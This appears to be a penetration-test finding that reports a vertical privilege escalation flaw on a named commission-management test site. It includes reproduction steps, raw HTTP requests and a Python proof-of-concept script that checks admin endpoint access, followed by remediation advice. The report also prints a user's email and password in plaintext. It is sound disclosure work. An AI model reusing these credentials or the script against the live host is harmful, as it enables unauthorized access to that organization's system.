# Vertical Privilege Escalation: Organization Users Can Access Admin Endpoints

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-02-26 11:47:21 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/admin/menu-api-access/get-all, /api/Role/GetAllControllers
**Method:** GET
**CWE:** CWE-284
**CVSS:** 8.3

## Description

A critical vertical privilege escalation vulnerability was discovered in the commission management application. Organization-level users can access administrative endpoints that should be restricted to admin users only.

The vulnerability allows organization users to:
1. Access the complete menu access configuration for the entire application
2. Retrieve all available controllers and actions in the system
3. Gain insight into the application's internal structure and functionality

This vulnerability violates the principle of least privilege and enables organization users to access sensitive administrative functionality and data.

## Impact

Successful exploitation of this vulnerability allows organization users to:

1. **Gain Administrative Insight**: Access detailed information about all available administrative functions and menu structures
2. **Information Disclosure**: Obtain sensitive information about application architecture and internal endpoints
3. **Privilege Escalation Preparation**: Gather intelligence for further privilege escalation attacks
4. **Security Control Bypass**: Circumvent access controls designed to restrict administrative functionality to authorized personnel only

The business impact includes:
- Increased risk of unauthorized access to administrative functions
- Potential for further privilege escalation attacks
- Exposure of sensitive application architecture details
- Violation of regulatory compliance requirements for access control

## Technical Analysis

The vulnerability exists due to insufficient access control checks on administrative endpoints. The application fails to properly validate user roles before allowing access to sensitive administrative functionality.

**Vulnerable Endpoints:**
1. `/api/admin/menu-api-access/get-all` - Returns complete menu access configuration
2. `/api/Role/GetAllControllers` - Returns all available controllers and actions

**Technical Details:**
- Organization users with "Organization" role can successfully access these endpoints
- Both endpoints return HTTP 200 status codes with sensitive data
- The `/api/admin/menu-api-access/get-all` endpoint returns 25 menu items with operations like CREATE, VIEW, etc.
- The `/api/Role/GetAllControllers` endpoint returns 86,908 bytes of data containing controller information

**Root Cause:**
The application implements role-based access control but fails to properly enforce role restrictions on these administrative endpoints. The access control checks are either missing or incorrectly implemented, allowing lower-privileged users to access sensitive administrative data.

## Proof of Concept

**Step-by-Step Reproduction:**

1. Authenticate as an Organization user (e.g., nlnarayana3858@gmail.com / User@1234)
2. Send a GET request to `/api/admin/menu-api-access/get-all` with parameters:
   - `startRow=0`
   - `endRow=25`
   - `sortModel=[]`
   - `filterModel={}`
3. Observe that the request returns HTTP 200 with complete menu access configuration
4. Send a GET request to `/api/Role/GetAllControllers`
5. Observe that the request returns HTTP 200 with all available controllers and actions

**Proof of Concept Requests:**

1. Access menu API endpoint:
```
GET /api/admin/menu-api-access/get-all?startRow=0&endRow=25&sortModel=[]&filterModel={} HTTP/1.1
Host: commissionstest.callippus.in
Authorization: Bearer [Organization User Token]
```

2. Access controllers endpoint:
```
GET /api/Role/GetAllControllers HTTP/1.1
Host: commissionstest.callippus.in
Authorization: Bearer [Organization User Token]
```

```
import requests
import json
from urllib.parse import urljoin

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
ORGANIZATION_CREDENTIALS = {
    "email": "nlnarayana3858@gmail.com",
    "password": "User@1234"
}

def authenticate(email, password):
    """Authenticate and return token"""
    url = urljoin(BASE_URL, "/api/authenticate")
    payload = {
        "email": email,
        "password": password,
        "rememberMe": False
    }

    response = requests.post(url, json=payload, verify=False)
    if response.status_code == 200:
        return response.json().get("id_token")
    return None

def test_admin_endpoints(token):
    """Test access to admin endpoints"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # Test menu access endpoint
    menu_url = urljoin(BASE_URL, "/api/admin/menu-api-access/get-all")
    menu_params = {
        "startRow": 0,
        "endRow": 25,
        "sortModel": "[]",
        "filterModel": "{}"
    }

    menu_response = requests.get(menu_url, headers=headers, params=menu_params, verify=False)

    # Test controllers endpoint
    controllers_url = urljoin(BASE_URL, "/api/Role/GetAllControllers")
    controllers_response = requests.get(controllers_url, headers=headers, verify=False)

    return {
        "menu_access": {
            "url": menu_url,
            "status": menu_response.status_code,
            "length": len(menu_response.text),
            "access_granted": menu_response.status_code == 200
        },
        "controllers_access": {
            "url": controllers_url,
            "status": controllers_response.status_code,
            "length": len(controllers_response.text),
            "access_granted": controllers_response.status_code == 200
        }
    }

def main():
    print("=== Vertical Privilege Escalation PoC ===")

    # Authenticate as organization user
    print("1. Authenticating as organization user...")
    token = authenticate(ORGANIZATION_CREDENTIALS["email"], ORGANIZATION_CREDENTIALS["password"])
    if not token:
        print("Authentication failed!")
        return

    print("2. Testing access to admin endpoints...")
    results = test_admin_endpoints(token)

    # Display results
    print("\n=== RESULTS ===")
    print(f"Menu Access Endpoint: {results['menu_access']['url']}")
    print(f"  Status: {results['menu_access']['status']}")
    print(f"  Access Granted: {'YES (VULNERABLE)' if results['menu_access']['access_granted'] else 'NO'}")
    print(f"  Response Length: {results['menu_access']['length']}")

    print(f"\nControllers Endpoint: {results['controllers_access']['url']}")
    print(f"  Status: {results['controllers_access']['status']}")
    print(f"  Access Granted: {'YES (VULNERABLE)' if results['controllers_access']['access_granted'] else 'NO'}")
    print(f"  Response Length: {results['controllers_access']['length']}")

    # Determine vulnerability status
    vulnerable = results['menu_access']['access_granted'] or results['controllers_access']['access_granted']

    if vulnerable:
        print("\n⚠️  CRITICAL: Vertical privilege escalation vulnerability confirmed!")
        print("Organization user can access admin endpoints that should be restricted.")
    else:
        print("\n✅ No vertical privilege escalation vulnerability detected.")

if __name__ == "__main__":
    main()
```

## Remediation

**Immediate Remediation Steps:**

1. **Implement Proper Role-Based Access Control (RBAC):**
   - Add explicit role checks for all administrative endpoints
   - Ensure that only users with `ROLE_ADMIN` can access `/api/admin/*` endpoints
   - Implement middleware to validate user roles before processing requests

2. **Apply Principle of Least Privilege:**
   - Review all endpoints and ensure they are properly protected based on user roles
   - Remove unnecessary access for organization and client users
   - Implement a deny-by-default policy for administrative functionality

3. **Secure Administrative Endpoints:**
   - Add explicit authorization checks for `/api/admin/menu-api-access/get-all`
   - Add explicit authorization checks for `/api/Role/GetAllControllers`
   - Consider adding additional authentication factors for sensitive administrative actions

4. **Implement Access Control Testing:**
   - Create automated tests to verify that lower-privileged users cannot access administrative endpoints
   - Include access control checks in the CI/CD pipeline
   - Regularly audit access control implementation

**Long-Term Recommendations:**

1. **Centralize Access Control Logic:**
   - Implement a centralized access control service or library
   - Ensure consistent role validation across all application components
   - Use attribute-based access control (ABAC) for more granular control

2. **Implement API Gateway Security:**
   - Use an API gateway to enforce access control policies
   - Implement rate limiting and request validation at the gateway level
   - Add logging and monitoring for administrative endpoint access

3. **Conduct Security Testing:**
   - Perform regular penetration testing to identify access control vulnerabilities
   - Implement automated security scanning in the development pipeline
   - Conduct code reviews focused on access control implementation

4. **Monitor and Audit:**
   - Implement logging for all administrative endpoint access
   - Set up alerts for suspicious access patterns
   - Regularly review access logs for unauthorized access attempts

